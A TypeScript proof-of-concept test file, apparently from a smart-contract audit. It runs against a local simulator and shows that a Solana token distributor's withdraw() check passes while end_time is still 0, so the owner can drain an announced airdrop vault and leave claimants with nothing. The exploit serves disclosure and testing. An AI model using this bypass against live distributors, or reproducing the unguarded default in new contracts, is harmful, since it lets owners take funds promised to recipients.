// V-03 PoC — Premature Withdrawal via end_time = 0
//
// withdraw() guards against early withdrawal with:
//   require!(current_time > distributor.end_time, DistributionNotEnded)
//
// end_time defaults to 0. set_time() is the only instruction that sets it.
// Since Unix timestamps are ~1.75 × 10^9 in 2026, current_time > 0 is always true.
// The owner can therefore call withdraw() at any moment before set_time() is called —
// including AFTER the operator has published the merkle root announcing the airdrop.
//
// Run:
//   cd lib/boost-tokendistributor-solana
//   anchor build
//   npm install --legacy-peer-deps
//   ./node_modules/.bin/ts-mocha -t 60000 tests/poc_v03_premature_withdrawal.ts

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { TokenDistributor } from "../target/types/token_distributor";
import {
  TOKEN_PROGRAM_ID,
  createInitializeMintInstruction,
  createInitializeAccountInstruction,
  createMintToInstruction,
  getAccount,
} from "@solana/spl-token";
import { LiteSVM } from "litesvm";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import * as fs from "fs";
import * as crypto from "crypto";
import { assert } from "chai";

// ── Constants ─────────────────────────────────────────────────────────────────
const DISTRIBUTOR_SEED = "distributor";
const OWNER_NONCE_SEED = "owner_nonce";
const VAULT_SEED       = "vault";
const CLAIM_SEED       = "claim";

const NOMINAL_AMOUNT = 1000n;
const DECIMALS       = 0;
const MINT_SIZE      = 82;
const ACCOUNT_SIZE   = 165;

// ── LiteSVM helpers ───────────────────────────────────────────────────────────
function advanceSlot(svm: LiteSVM): void {
  const clock = svm.getClock();
  clock.slot += 1n;
  svm.setClock(clock);
}

function sendTx(
  svm: LiteSVM,
  feePayer: Keypair,
  tx: Transaction,
  signers: Keypair[],
): unknown {
  advanceSlot(svm);
  tx.recentBlockhash = svm.latestBlockhash();
  tx.feePayer = feePayer.publicKey;
  tx.sign(...signers);
  return svm.sendTransaction(tx);
}

function isFailure(result: unknown): boolean {
  const s = String(result);
  return (
    s.includes("FailedTransactionMetadata") ||
    s.includes("TransactionError") ||
    (s !== "undefined" && s.includes("Error"))
  );
}

class LiteSVMConnection {
  private readonly svm: LiteSVM;
  constructor(svm: LiteSVM) {
    this.svm = svm;
  }
  async getLatestBlockhash() {
    return { blockhash: this.svm.latestBlockhash(), lastValidBlockHeight: 0 };
  }
  async getMinimumBalanceForRentExemption() {
    return 0;
  }
  async getAccountInfo(pubkey: PublicKey) {
    const account = this.svm.getAccount(pubkey);
    if (!account) return null;
    return {
      executable: account.executable,
      owner: account.owner,
      lamports: Number(account.lamports),
      data: Buffer.from(account.data),
      rentEpoch: 0,
    };
  }
  async getAccountInfoAndContext(pubkey: PublicKey) {
    return {
      context: { slot: Number(this.svm.getClock().slot) },
      value: await this.getAccountInfo(pubkey),
    };
  }
  async getMultipleAccountsInfo(pubkeys: PublicKey[]) {
    return Promise.all(pubkeys.map((p) => this.getAccountInfo(p)));
  }
}

// ── SPL Token helpers ─────────────────────────────────────────────────────────
function createPlainMint(svm: LiteSVM, payer: Keypair, mintAuth: PublicKey): Keypair {
  const mint = Keypair.generate();
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: mint.publicKey,
      lamports:         5_000_000,
      space:            MINT_SIZE,
      programId:        TOKEN_PROGRAM_ID,
    }),
    createInitializeMintInstruction(mint.publicKey, DECIMALS, mintAuth, null),
  );
  sendTx(svm, payer, tx, [payer, mint]);
  return mint;
}

function createSplTokenAccount(
  svm:   LiteSVM,
  mint:  PublicKey,
  owner: PublicKey,
  payer: Keypair,
): Keypair {
  const account = Keypair.generate();
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: account.publicKey,
      lamports:         5_000_000,
      space:            ACCOUNT_SIZE,
      programId:        TOKEN_PROGRAM_ID,
    }),
    createInitializeAccountInstruction(account.publicKey, mint, owner),
  );
  sendTx(svm, payer, tx, [payer, account]);
  return account;
}

function merkleLeaf(claimant: PublicKey, amount: bigint): Buffer {
  const amtBuf = Buffer.alloc(8);
  amtBuf.writeBigUInt64LE(amount);
  return crypto
    .createHash("sha256")
    .update(Buffer.concat([claimant.toBuffer(), amtBuf]))
    .digest();
}

// ── Test suite ────────────────────────────────────────────────────────────────
describe("token_distributor — V-03 premature withdrawal (end_time = 0 bypass)", () => {
  let svm:        LiteSVM;
  let program:    Program<TokenDistributor>;
  let programId:  PublicKey;
  let connection: LiteSVMConnection;

  let owner:    Keypair;
  let operator: Keypair;
  let claimant: Keypair;

  let mint:        Keypair;
  let ownerAta:    Keypair;
  let claimantAta: Keypair;

  let ownerNoncePda:     PublicKey;
  let distributorPda:    PublicKey;
  let vaultPda:          PublicKey;
  let claimStatusPda:    PublicKey;
  let eventAuthorityPda: PublicKey;

  before(async () => {
    svm = new LiteSVM();

    // LiteSVM initialises unix_timestamp to 0. The vulnerability is only visible when
    // the clock carries a real-world Unix timestamp (~1.75 × 10^9 in 2026), because the
    // guard require!(current_time > end_time) trivially passes only when current_time >> 0.
    // Seed the clock to the actual current wall-clock time.
    const initClock = svm.getClock();
    initClock.unixTimestamp = BigInt(Math.floor(Date.now() / 1000));
    svm.setClock(initClock);

    const programBytes = fs.readFileSync("./target/deploy/token_distributor.so");
    const idl = JSON.parse(
      fs.readFileSync("./target/idl/token_distributor.json", "utf8"),
    );
    programId = new PublicKey(idl.address);
    svm.addProgram(programId, programBytes);

    owner    = Keypair.generate();
    operator = Keypair.generate();
    claimant = Keypair.generate();

    svm.airdrop(owner.publicKey,    BigInt(100 * LAMPORTS_PER_SOL));
    svm.airdrop(operator.publicKey, BigInt(LAMPORTS_PER_SOL));
    svm.airdrop(claimant.publicKey, BigInt(LAMPORTS_PER_SOL));

    mint        = createPlainMint(svm, owner, owner.publicKey);
    ownerAta    = createSplTokenAccount(svm, mint.publicKey, owner.publicKey,    owner);
    claimantAta = createSplTokenAccount(svm, mint.publicKey, claimant.publicKey, owner);

    sendTx(svm, owner, new Transaction().add(
      createMintToInstruction(
        mint.publicKey,
        ownerAta.publicKey,
        owner.publicKey,
        Number(NOMINAL_AMOUNT),
      ),
    ), [owner]);

    connection = new LiteSVMConnection(svm);
    const provider = new anchor.AnchorProvider(
      connection as any,
      new anchor.Wallet(owner),
      { commitment: "processed" },
    );
    program = new anchor.Program(idl as anchor.Idl, provider) as Program<TokenDistributor>;

    [ownerNoncePda] = PublicKey.findProgramAddressSync(
      [Buffer.from(OWNER_NONCE_SEED), owner.publicKey.toBuffer()],
      programId,
    );
    const nonceBuf = new anchor.BN(1).toArrayLike(Buffer, "le", 4);
    [distributorPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(DISTRIBUTOR_SEED),
        mint.publicKey.toBuffer(),
        owner.publicKey.toBuffer(),
        nonceBuf,
      ],
      programId,
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from(VAULT_SEED), distributorPda.toBuffer()],
      programId,
    );
    [claimStatusPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(CLAIM_SEED),
        distributorPda.toBuffer(),
        claimant.publicKey.toBuffer(),
      ],
      programId,
    );
    [eventAuthorityPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("__event_authority")],
      programId,
    );
  });

  // ── Test 1: create_distributor and verify end_time is 0 ──────────────────────
  it("create_distributor succeeds — distributor.end_time defaults to 0", async () => {
    const ix = await program.methods
      .createDistributor(new anchor.BN(NOMINAL_AMOUNT.toString()))
      .accounts({
        ownerNonce:        ownerNoncePda,
        distributor:       distributorPda,
        tokenVault:        vaultPda,
        tokenMint:         mint.publicKey,
        ownerTokenAccount: ownerAta.publicKey,
        owner:             owner.publicKey,
        operator:          operator.publicKey,
        systemProgram:     SystemProgram.programId,
        tokenProgram:      TOKEN_PROGRAM_ID,
        rent:              anchor.web3.SYSVAR_RENT_PUBKEY,
        eventAuthority:    eventAuthorityPda,
        program:           programId,
      })
      .instruction();

    const result = sendTx(svm, owner, new Transaction().add(ix), [owner]);
    assert.isFalse(isFailure(result), `create_distributor must succeed: ${result}`);

    const distributorState = await program.account.tokenDistributor.fetch(distributorPda);
    const vault = await getAccount(connection as any, vaultPda, undefined, TOKEN_PROGRAM_ID);

    assert.equal(
      distributorState.endTime.toString(), "0",
      "end_time must be 0 before set_time is called",
    );
    assert.equal(
      vault.amount.toString(), NOMINAL_AMOUNT.toString(),
      "vault holds full deposit",
    );

    const currentTime = Number(svm.getClock().unixTimestamp);
    console.log("  ✔ distributor created — end_time = 0");
    console.log(`  vault.amount         = ${vault.amount}`);
    console.log(`  distributor.end_time = ${distributorState.endTime}`);
    console.log(`  svm clock timestamp  = ${currentTime}`);
    console.log(`  withdraw guard check: ${currentTime} > 0 → TRUE (bypass always active)`);
  });

  // ── Test 2: operator publishes merkle root — airdrop is now "live" to users ──
  it("operator sets merkle root — airdrop announced, users expect to claim", async () => {
    const leaf = merkleLeaf(claimant.publicKey, NOMINAL_AMOUNT);
    const result = sendTx(svm, operator, new Transaction().add(
      await program.methods
        .setMerkleRoot(Array.from(leaf))
        .accounts({ distributor: distributorPda, operator: operator.publicKey, eventAuthority: eventAuthorityPda, program: programId })
        .instruction(),
    ), [operator]);
    assert.isFalse(isFailure(result), `setMerkleRoot must succeed: ${result}`);

    const distributorState = await program.account.tokenDistributor.fetch(distributorPda);

    // end_time is still 0 — set_time has NOT been called
    assert.equal(distributorState.endTime.toString(), "0", "end_time still 0 after setMerkleRoot");
    assert.notDeepEqual(
      distributorState.merkleRoot,
      new Array(32).fill(0),
      "merkle root is now set",
    );

    console.log("  ✔ merkle root published — claimant has a valid off-chain proof");
    console.log("  ⚠  set_time has NOT been called — end_time remains 0");
    console.log("  ⚠  withdraw() guard: current_time > 0 is trivially true — vault is drainable");
  });

  // ── Test 3: owner calls withdraw() before set_time — vault drained ────────────
  it("withdraw() succeeds before set_time is called — end_time = 0 bypasses the guard", async () => {
    const ownerPreBalance = (
      await getAccount(connection as any, ownerAta.publicKey, undefined, TOKEN_PROGRAM_ID)
    ).amount;

    // CRITICAL: set_time has NOT been called.
    // withdraw.rs:101 — require!(current_time > distributor.end_time, DistributionNotEnded)
    // With end_time = 0 and current_time ≈ 1.75 × 10^9, this check trivially passes.
    const withdrawIx = await program.methods
      .withdraw()
      .accounts({
        distributor:       distributorPda,
        tokenVault:        vaultPda,
        tokenMint:         mint.publicKey,
        ownerTokenAccount: ownerAta.publicKey,
        owner:             owner.publicKey,
        tokenProgram:      TOKEN_PROGRAM_ID,
        eventAuthority:    eventAuthorityPda,
        program:           programId,
      })
      .instruction();

    const result = sendTx(svm, owner, new Transaction().add(withdrawIx), [owner]);
    assert.isFalse(isFailure(result), `withdraw must succeed with end_time = 0: ${result}`);

    const ownerPostBalance = (
      await getAccount(connection as any, ownerAta.publicKey, undefined, TOKEN_PROGRAM_ID)
    ).amount;

    assert.equal(
      (ownerPostBalance - ownerPreBalance).toString(),
      NOMINAL_AMOUNT.toString(),
      "owner recovered all 1000 tokens",
    );

    // LiteSVM zeroes closed accounts (lamports = 0) rather than removing them
    // from its account map. Accept either null or lamports = 0 as "closed".
    const vaultRaw = svm.getAccount(vaultPda);
    assert.isTrue(
      vaultRaw === null || Number(vaultRaw.lamports) === 0,
      "vault closed (null or lamports = 0)",
    );
    const distributorRaw = svm.getAccount(distributorPda);
    assert.isTrue(
      distributorRaw === null || Number(distributorRaw.lamports) === 0,
      "distributor closed (null or lamports = 0)",
    );

    console.log("  ✔ withdraw succeeded — end_time = 0 guard bypass confirmed");
    console.log(`  owner balance increase: ${ownerPostBalance - ownerPreBalance} tokens`);
    console.log(`  vault account:       ${vaultRaw === null ? "null" : "lamports=" + vaultRaw.lamports}`);
    console.log(`  distributor account: ${distributorRaw === null ? "null" : "lamports=" + distributorRaw.lamports}`);
    console.log("  set_time was never called — claimant's merkle proof is now worthless");
  });

  // ── Test 4: claimant finds distributor closed — cannot claim ─────────────────
  it("claimant cannot claim — distributor account was closed by premature withdraw", async () => {
    // The distributor is closed. Any attempt to pass it as an Account<TokenDistributor>
    // fails Anchor's account deserialization / existence check.
    const claimIx = await program.methods
      .claim(new anchor.BN(NOMINAL_AMOUNT.toString()), [])
      .accounts({
        distributor:          distributorPda,
        claimStatus:          claimStatusPda,
        tokenVault:           vaultPda,
        claimantTokenAccount: claimantAta.publicKey,
        tokenMint:            mint.publicKey,
        claimant:             claimant.publicKey,
        systemProgram:        SystemProgram.programId,
        tokenProgram:         TOKEN_PROGRAM_ID,
        eventAuthority:       eventAuthorityPda,
        program:              programId,
      })
      .instruction();

    let claimFailed = false;
    let claimResult: unknown;
    try {
      claimResult = sendTx(svm, claimant, new Transaction().add(claimIx), [claimant]);
      if (isFailure(claimResult)) claimFailed = true;
    } catch (e) {
      claimFailed = true;
      claimResult = e;
    }

    assert.isTrue(claimFailed, `claim must fail after distributor is closed: ${claimResult}`);

    const claimantAcct = await getAccount(
      connection as any, claimantAta.publicKey, undefined, TOKEN_PROGRAM_ID,
    );
    assert.equal(claimantAcct.amount.toString(), "0", "claimant received 0 tokens");

    console.log("  ✔ claim failed — distributor account no longer exists");
    console.log(`  revert: ${String(claimResult).slice(0, 120)}`);
    console.log("  claimant received: 0 tokens");
    console.log("  summary: owner announced airdrop via merkle root, then drained vault — claimant has no recourse");
  });
});
